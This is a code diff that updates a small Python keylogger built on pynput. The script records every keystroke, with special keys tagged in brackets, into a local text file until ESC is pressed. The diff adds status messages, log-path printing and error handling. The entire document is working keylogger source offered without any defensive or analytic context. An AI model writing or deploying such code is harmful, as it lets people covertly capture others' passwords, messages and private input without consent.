@@ -1,37 +1,40 @@
 from pynput import keyboard
+import os
 
-# File where logs will be saved
+# File to save the keystrokes
 log_file = "qwertyone.txt"
+print("🔐 Keylogger has started. Press ESC to stop.")
+print("Saving log to:", os.path.abspath(log_file))
 
 def on_press(key):
     try:
         with open(log_file, "a") as f:
-            # Regular character keys
             f.write(f"{key.char}")
     except AttributeError:
-        with open(log_file, "a") as f:
-            # Handle special keys
-            if key == keyboard.Key.space:
-                f.write(" [SPACE] ")
-            elif key == keyboard.Key.enter:
-                f.write(" [ENTER]\n")
-            elif key == keyboard.Key.tab:
-                f.write(" [TAB] ")
-            elif key == keyboard.Key.backspace:
-                f.write(" [BACKSPACE] ")
-            elif key == keyboard.Key.esc:
-                f.write(" [ESC] ")
-            else:
-                f.write(f" [{key}] ")
+        try:
+            with open(log_file, "a") as f:
+                if key == keyboard.Key.space:
+                    f.write(" [SPACE] ")
+                elif key == keyboard.Key.enter:
+                    f.write(" [ENTER]\n")
+                elif key == keyboard.Key.tab:
+                    f.write(" [TAB] ")
+                elif key == keyboard.Key.backspace:
+                    f.write(" [BACKSPACE] ")
+                elif key == keyboard.Key.esc:
+                    f.write(" [ESC] ")
+                else:
+                    f.write(f" [{key}] ")
+        except Exception as e:
+            print("Special key write error:", e)
+    except Exception as e:
+        print("Character key write error:", e)
 
 def on_release(key):
-    # Stop the listener when ESC is pressed
     if key == keyboard.Key.esc:
+        print("🛑 Keylogger stopped.")
         return False
 
-# Print a message before starting the keylogger
-print("... has started. Press ESC to stop.")
-
-# Start listening to keyboard events
+# Start the keylogger
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
